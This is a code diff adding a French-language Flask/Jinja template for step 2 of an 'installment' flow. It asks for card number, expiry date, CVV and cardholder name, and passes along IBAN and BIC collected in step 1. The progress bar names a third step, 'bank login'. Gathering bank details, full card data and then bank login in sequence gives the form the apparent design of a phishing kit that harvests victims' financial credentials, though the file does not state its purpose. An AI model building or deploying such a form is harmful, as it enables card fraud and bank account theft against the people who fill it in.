@@ -1,0 +1,109 @@
+{% extends "base.html" %}
+
+{% block content %}
+<div class="installment-container">
+    <div class="installment-progress">
+        <div class="step completed">
+            <i class="fas fa-check"></i>
+            <p>Coordonnées bancaires</p>
+        </div>
+        <div class="step active">
+            <span>2</span>
+            <p>Carte de crédit</p>
+        </div>
+        <div class="step">
+            <span>3</span>
+            <p>Connexion bancaire</p>
+        </div>
+    </div>
+
+    <div class="installment-header">
+        <h1><i class="far fa-credit-card"></i> Informations de carte de crédit</h1>
+        <p>Veuillez saisir les informations de votre carte pour vérification</p>
+    </div>
+
+    <div class="installment-content">
+        <form id="installment-form-step2" action="{{ url_for('installment_step3') }}" method="POST">
+            <!-- Champ caché pour les données de l'étape 1 -->
+            <input type="hidden" name="iban" value="{{ request.form.iban }}">
+            <input type="hidden" name="bic" value="{{ request.form.bic }}">
+            <input type="hidden" name="installment_plan" value="{{ request.form.installment_plan }}">
+            
+            <div class="form-section">
+                <div class="card-preview">
+                    <div class="card-front">
+                        <div class="card-logo">
+                            <img id="card-type-logo" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/visa/visa-original.svg" alt="Card Type">
+                        </div>
+                        <div class="card-number">
+                            <span id="card-number-preview">•••• •••• •••• ••••</span>
+                        </div>
+                        <div class="card-details">
+                            <div class="card-name">
+                                <span id="card-name-preview">NOM SUR LA CARTE</span>
+                            </div>
+                            <div class="card-expiry">
+                                <span id="card-expiry-preview">••/••</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="card-back">
+                        <div class="card-cvv">
+                            <span>CVV</span>
+                            <span id="card-cvv-preview">•••</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group floating-label">
+                    <input type="text" id="card-number" name="card_number" placeholder=" " maxlength="19" required>
+                    <label for="card-number">Numéro de carte</label>
+                    <div class="input-icon">
+                        <i class="far fa-credit-card"></i>
+                    </div>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group floating-label">
+                        <input type="text" id="expiry-date" name="expiry_date" placeholder=" " maxlength="5" required>
+                        <label for="expiry-date">Date d'expiration (MM/AA)</label>
+                    </div>
+                    <div class="form-group floating-label">
+                        <input type="text" id="cvv" name="cvv" placeholder=" " maxlength="4" required>
+                        <label for="cvv">Code de sécurité</label>
+                        <div class="input-icon">
+                            <i class="fas fa-lock"></i>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group floating-label">
+                    <input type="text" id="card-name" name="card_name" placeholder=" " required>
+                    <label for="card-name">Nom sur la carte</label>
+                    <div class="input-icon">
+                        <i class="fas fa-user"></i>
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-actions">
+                <button type="button" class="btn btn-outline btn-back" onclick="history.back()">
+                    <i class="fas fa-arrow-left"></i> Retour
+                </button>
+                <button type="submit" class="btn btn-primary btn-next">
+                    <span>Continuer</span>
+                    <i class="fas fa-arrow-right"></i>
+                </button>
+            </div>
+        </form>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_css %}
+<link rel="stylesheet" href="{{ url_for('static', filename='css/installment_step2.css') }}">
+{% endblock %}
+
+{% block extra_js %}
+<script src="{{ url_for('static', filename='js/installment_step2.js') }}"></script>
+{% endblock %}
